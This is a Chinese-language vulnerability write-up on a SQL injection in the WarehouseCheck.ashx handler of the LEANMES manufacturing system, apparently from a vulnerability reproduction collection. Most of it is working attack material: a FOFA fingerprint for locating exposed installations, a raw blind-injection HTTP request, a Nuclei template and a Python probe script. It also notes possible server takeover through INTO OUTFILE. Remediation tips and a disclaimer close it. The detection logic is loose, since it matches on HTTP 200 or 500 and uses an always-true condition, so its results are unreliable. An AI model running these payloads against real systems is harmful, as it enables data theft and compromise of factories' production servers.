# 深科特LEANMES系统 WarehouseCheck.ashx SQL注入漏洞分析

**漏洞编号**：待提交
**发现日期**：2026年3月15日
**漏洞作者**：wuyaoxuexi.cn

---

## 一、漏洞概述

深科特LEANMES系统是一款面向制造业的MES（制造执行系统）软件。本次发现的SQL注入漏洞位于 `WarehouseCheck.ashx` 接口，攻击者可通过该漏洞执行恶意SQL语句，获取数据库中的敏感信息，甚至可能通过数据库写文件等方式getshell。

## 二、影响版本

- 深科特LEANMES（全版本）

## 三、漏洞详情

| 项目 | 内容 |
|------|------|
| 漏洞类型 | SQL注入 |
| 漏洞位置 | `/Handler/WarehouseCheck.ashx` |
| 请求方法 | GET |
| 参数名 | `api`, `orderNo`, `itemCode` |

**FOFA查询语句**：
```
icon_hash="1505132128"
```

## 四、漏洞复现

### 4.1 漏洞URL

```
GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1&itemCode=1
```

### 4.2 POC - 盲注测试

```http
GET /Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1' AND 9304 IN (SELECT (CHAR(113)+CHAR(98)+CHAR(113)+CHAR(98)+CHAR(113)+(SELECT (CASE WHEN (9304=9304) THEN CHAR(49) ELSE CHAR(48) END))+CHAR(113)+CHAR(118)+CHAR(107)+CHAR(120)+CHAR(113)))--+keHv&itemCode=1 HTTP/1.1
Host: target.com
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```

> 通过响应是否异常来判断漏洞是否存在

### 4.3 Nuclei检测POC

```yaml
id: leanmes-warehousecheck-sql
info:
  name: 深科特LEANMES WarehouseCheck SQL注入漏洞
  author: wuyaoxuexi.cn
  severity: critical
  description: 深科特LEANMES系统WarehouseCheck.ashx接口存在SQL注入漏洞
  reference:
    - https://mp.weixin.qq.com/s/JMQ96xrHaEmx7TPCrz5e5w
  tags: sql injection,leanmes,mes

requests:
  - method: GET
    path:
      - "{{BaseURL}}/Handler/WarehouseCheck.ashx?api=GetGrnInfoList&orderNo=1%27%20AND%209304%20IN%20%28SELECT%20%28CHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2BCHAR%2898%29%2BCHAR%28113%29%2B%28SELECT%20%28CASE%20WHEN%20%289304%3D9304%29%20THEN%20CHAR%2849%29%20ELSE%20CHAR%2848%29%20END%29%29%2BCHAR%28113%29%2BCHAR%28118%29%2BCHAR%28107%29%2BCHAR%28120%29%2BCHAR%28113%29%29%29--+keHv&itemCode=1"
    headers:
      User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
      Accept: "*/*"
      Connection: Keep-Alive
    matchers:
      - type: word
        words:
          - "System.Data"
          - "SqlException"
          - "ORA-"
          - "MySQL"
        part: body
      - type: status
        status:
          - 500
          - 200
```

**使用方法**：
```bash
nuclei -t leanmes-warehousecheck-sql.yaml -u http://target.com
```

### 4.4 Python POC

```python
import requests

url = "http://target.com/Handler/WarehouseCheck.ashx"
params = {
    "api": "GetGrnInfoList",
    "orderNo": "1' AND 1=1--",
    "itemCode": "1"
}

try:
    r = requests.get(url, params=params, timeout=10)
    if "ORA-" in r.text or "SqlException" in r.text or r.status_code == 500:
        print("[+] 存在SQL注入漏洞")
    else:
        print("[-] 未检测到漏洞")
except Exception as e:
    print(f"[!] 错误: {e}")
```

### 4.5 POC成功截图

> 以下为漏洞检测成功示意图：

![POC成功回显](./poc-success.png)

## 五、漏洞危害

- 数据库敏感数据泄露
- 服务器敏感信息泄露
- 可能通过 `INTO OUTFILE` 等方式getshell
- 可能导致整个系统被攻击者控制

## 六、修复建议

1. **打补丁**：联系厂商获取最新安全更新
2. **参数化查询**：对所有用户输入使用预编译语句
3. **输入过滤**：严格过滤单引号、双引号等特殊字符
4. **访问控制**：限制接口访问来源，添加IP白名单
5. **安全审计**：定期进行安全测试

## 七、声明

本文仅供技术学习交流，请勿利用文中所述技术从事非法测试。利用本文提供的信息造成的一切后果由使用者本人承担，与本文作者无关。

---

**参考来源**：南风漏洞复现文库
